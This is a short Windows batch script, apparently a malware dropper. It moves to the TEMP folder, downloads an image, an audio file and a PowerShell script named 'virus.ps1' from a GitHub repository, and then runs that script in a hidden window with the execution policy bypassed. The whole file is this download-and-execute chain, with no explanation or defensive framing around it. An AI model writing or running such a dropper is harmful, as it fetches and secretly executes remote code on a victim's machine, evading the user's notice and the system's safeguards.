@echo off
cd /d %TEMP%
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/smecherucarbarou/doidulai/master/imagine.JPG' -OutFile 'imagine.JPG'; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/smecherucarbarou/doidulai/master/latrat.mp3' -OutFile 'latrat.mp3'; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/smecherucarbarou/doidulai/master/virus.ps1' -OutFile 'virus.ps1'"
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%TEMP%\virus.ps1"